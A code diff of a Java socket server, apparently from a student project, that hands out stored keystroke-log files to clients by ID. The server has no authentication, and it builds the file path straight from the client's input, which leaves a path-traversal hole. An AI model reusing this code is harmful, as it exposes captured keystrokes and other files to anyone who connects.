@@ -1,42 +1,38 @@
 package com.server.liveowl.Keylogger;
 
-import java.io.BufferedInputStream;
-import java.io.BufferedOutputStream;
+import java.io.BufferedReader;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.FileInputStream;
+import java.io.InputStreamReader;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.util.Date;
 
 public class FTPServerSetup {
-    public static void main(String[] args) throws Exception {
-        ServerSocket server = new ServerSocket(8888);
-        System.out.println("Server đã sẵn sàng lắng nghe...");
-        while (true) {
-            try (Socket soc = server.accept();
-                 DataInputStream dis = new DataInputStream(soc.getInputStream());
-                 DataOutputStream dos = new DataOutputStream(soc.getOutputStream())) {
+public static void main(String[] args) throws Exception {
+    ServerSocket server = new ServerSocket(8888);
+    System.out.println("Server đã sẵn sàng lắng nghe...");
 
-                String msg = dis.readUTF();
+    while (true) {
+        try (Socket soc = server.accept();
+             DataInputStream dis = new DataInputStream(soc.getInputStream());
+             DataOutputStream dos = new DataOutputStream(soc.getOutputStream())) {
 
-                if (msg.equals("getTime")) {
-                    dos.writeUTF(new Date().toString());
-                } else if (msg.equals("getClassName")) {
-                    dos.writeUTF("Lập Trình Mạng");
-                } else if (msg.equals("getFile")) {
-                    String filePath = "D:/PBL4/LiveOwlServer/src/main/java/com/server/liveowl/Keylogger/fd720a2e_keylogs.txt"; // Đường dẫn file chính xác
-                    try (BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(filePath));
-                         BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(soc.getOutputStream())) {
-                        int c;
-                        while ((c = bufferedInputStream.read()) != -1) {
-                            bufferedOutputStream.write(c);
-                        }
-                    }
+            // Nhận ID từ client
+            String id = dis.readUTF();
+            String filePath = "D:/PBL4/LiveOwlServer/src/main/java/com/server/liveowl/Keylogger/" + id + "_keylogs.txt";
+
+            // Mở tệp và gửi từng dòng cho client
+            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(filePath)))) {
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    dos.writeUTF(line);
                 }
-            } catch (Exception e) {
-                System.out.println("Lỗi: " + e.getMessage());
+                dos.writeUTF("EOF");
             }
+        } catch (Exception e) {
+            System.out.println("Lỗi: " + e.getMessage());
         }
     }
+}
 }
